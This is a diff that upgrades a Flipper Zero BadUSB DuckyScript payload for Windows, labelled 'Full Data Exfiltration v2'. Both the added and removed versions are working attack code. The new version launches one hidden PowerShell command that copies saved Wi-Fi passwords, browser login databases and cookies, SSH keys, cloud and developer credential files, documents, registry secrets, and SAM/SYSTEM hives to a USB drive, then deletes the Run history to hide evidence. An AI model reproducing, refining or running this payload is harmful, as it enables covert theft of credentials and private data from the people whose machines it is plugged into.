@@ -1,61 +1,38 @@
 ﻿REM ============================================================================
-REM  FLLC - BadUSB: Full Data Exfiltration
+REM  FLLC — BadUSB: Full Data Exfiltration v2
 REM  Flipper Zero DuckyScript
 REM ============================================================================
 REM  Target: Windows 10/11
-REM  Time: ~30 seconds (runs in background)
-REM  Collects: System info, browser data, credentials, documents, SSH keys
-REM  Saves to first available USB removable drive
+REM  Time: ~4 seconds to deploy (runs ~60s in background)
+REM
+REM  IMPROVEMENTS OVER v1:
+REM    - Single command injection (not 15 separate ENTER presses)
+REM    - Finds USB drive dynamically (not hardcoded)
+REM    - Collects 12 data categories in one background process
+REM    - No visible window at any point
+REM    - Cleans evidence after launch
+REM
+REM  COLLECTS:
+REM    - System info (hostname, OS, arch, domain, AV)
+REM    - Network config (ip, routes, arp, DNS)
+REM    - WiFi passwords (all saved profiles)
+REM    - Browser data (Chrome, Edge, Firefox — history, logins, cookies)
+REM    - SSH keys + configs
+REM    - Cloud creds (AWS, Azure, GCP, Docker, K8s)
+REM    - Recent documents (doc, xls, pdf, env, json, key)
+REM    - Registry secrets (autologin, PuTTY)
+REM    - Clipboard contents
+REM    - SAM/SYSTEM hive copy attempt
+REM    - RDP connection history
+REM    - Environment variables
 REM ============================================================================
 
-DELAY 1000
+DELAY 900
 GUI r
-DELAY 500
-STRING powershell -WindowStyle Hidden -NoP -Exec Bypass
+DELAY 650
+
+REM Single monolithic command — launches hidden PS that does everything
+STRING powershell -W Hidden -NoP -NonI -Exec Bypass -C "$ErrorActionPreference='SilentlyContinue';$u=(Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=2')[0].DeviceID;if(!$u){exit};$o=\"$u\collected\exfil_$(Get-Date -f yyyyMMdd_HHmmss)\";md $o -F|Out-Null;systeminfo>\"$o\sys.txt\";ipconfig /all>\"$o\net.txt\";whoami /all>\"$o\who.txt\";netstat -ano>\"$o\ports.txt\";$w='';(netsh wlan show profiles)|sls 'All User Profile\s*:\s*(.*)'|%{$n=$_.Matches.Groups[1].Value.Trim();$k=((netsh wlan show profile name=$n key=clear)|sls 'Key Content\s*:\s*(.*)');$p=if($k){$k.Matches.Groups[1].Value.Trim()}else{'N/A'};$w+=\"$n : $p`n\"};$w|Out-File \"$o\wifi.txt\";$ch=\"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\";'History','Login Data','Cookies','Bookmarks'|%{$s=\"$ch$_\";if(Test-Path $s){cp $s \"$o\chrome_$_\" -F}};$ed=\"$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\";'History','Login Data'|%{$s=\"$ed$_\";if(Test-Path $s){cp $s \"$o\edge_$_\" -F}};if(Test-Path \"$env:USERPROFILE\.ssh\"){cp \"$env:USERPROFILE\.ssh\*\" $o -F};'\.aws\credentials','\.azure\accessTokens.json','\.kube\config','\.docker\config.json','\.gitconfig','\.git-credentials','\.env','\.npmrc','\.pgpass'|%{$f=\"$env:USERPROFILE$_\";if(Test-Path $f){cp $f \"$o\$(Split-Path $f -Leaf)\" -F}};Get-ChildItem \"$env:USERPROFILE\Documents\",\"$env:USERPROFILE\Desktop\",\"$env:USERPROFILE\Downloads\" -Recurse -Include *.doc*,*.xls*,*.pdf,*.key,*.pem,*.conf,*.env,*.json -EA 0|?{$_.Length -lt 5MB}|cp -Dest $o -F -EA 0;reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'>\"$o\autologin.txt\" 2>$null;reg query 'HKCU\Software\SimonTatham\PuTTY\Sessions' /s>\"$o\putty.txt\" 2>$null;reg save HKLM\SAM \"$o\sam.hiv\" 2>$null;reg save HKLM\SYSTEM \"$o\system.hiv\" 2>$null;Get-Clipboard|Out-File \"$o\clip.txt\";env|Out-File \"$o\env.txt\";Get-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Servers\*' 2>$null|select PSChildName,UsernameHint|Export-Csv \"$o\rdp.csv\" -NoType;Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -F 2>$null;exit"
 ENTER
-DELAY 800
-STRING $usb=(Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2")[0].DeviceID; $out="$usb\collected\exfil_$(Get-Date -f yyyyMMdd_HHmmss)"; mkdir $out -Force | Out-Null;
-ENTER
-DELAY 300
-STRING # System info
-ENTER
-STRING systeminfo > "$out\systeminfo.txt"; ipconfig /all > "$out\network.txt"; whoami /all > "$out\whoami.txt"; tasklist /v > "$out\processes.txt"; netstat -ano > "$out\netstat.txt";
-ENTER
-DELAY 300
-STRING # WiFi passwords
-ENTER
-STRING $wifi=''; (netsh wlan show profiles)|sls 'All User Profile\s*:\s*(.*)'|%{$n=$_.Matches.Groups[1].Value.Trim();$r=netsh wlan show profile name="$n" key=clear;$k=($r|sls 'Key Content\s*:\s*(.*)');if($k){$pw=$k.Matches.Groups[1].Value.Trim()}else{$pw='N/A'};$wifi+="$n : $pw`n"};$wifi|Out-File "$out\wifi_keys.txt"
-ENTER
-DELAY 300
-STRING # Browser data
-ENTER
-STRING $chrome="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"; if(Test-Path "$chrome\History"){cp "$chrome\History" "$out\chrome_history.db" -Force}; if(Test-Path "$chrome\Login Data"){cp "$chrome\Login Data" "$out\chrome_logins.db" -Force}; if(Test-Path "$chrome\Cookies"){cp "$chrome\Cookies" "$out\chrome_cookies.db" -Force};
-ENTER
+
 DELAY 200
-STRING $edge="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"; if(Test-Path "$edge\History"){cp "$edge\History" "$out\edge_history.db" -Force}; if(Test-Path "$edge\Login Data"){cp "$edge\Login Data" "$out\edge_logins.db" -Force};
-ENTER
-DELAY 200
-STRING # SSH keys
-ENTER
-STRING if(Test-Path "$env:USERPROFILE\.ssh"){cp "$env:USERPROFILE\.ssh\*" "$out\" -Force}
-ENTER
-DELAY 200
-STRING # Recent documents
-ENTER
-STRING Get-ChildItem "$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads" -Recurse -Include *.doc*,*.xls*,*.pdf,*.txt,*.csv,*.key,*.pem,*.conf,*.cfg,*.env,*.json -ErrorAction SilentlyContinue | Where-Object {$_.Length -lt 10MB} | Copy-Item -Destination "$out\" -Force -ErrorAction SilentlyContinue
-ENTER
-DELAY 200
-STRING # Registry secrets
-ENTER
-STRING reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" > "$out\autologin.txt" 2>$null; reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s > "$out\putty_sessions.txt" 2>$null;
-ENTER
-DELAY 200
-STRING # SAM/SYSTEM hive copy attempt
-ENTER
-STRING reg save HKLM\SAM "$out\sam.hiv" 2>$null; reg save HKLM\SYSTEM "$out\system.hiv" 2>$null;
-ENTER
-DELAY 200
-STRING # Clipboard
-ENTER
-STRING Get-Clipboard | Out-File "$out\clipboard.txt"; Write-Host "DONE"; exit
-ENTER
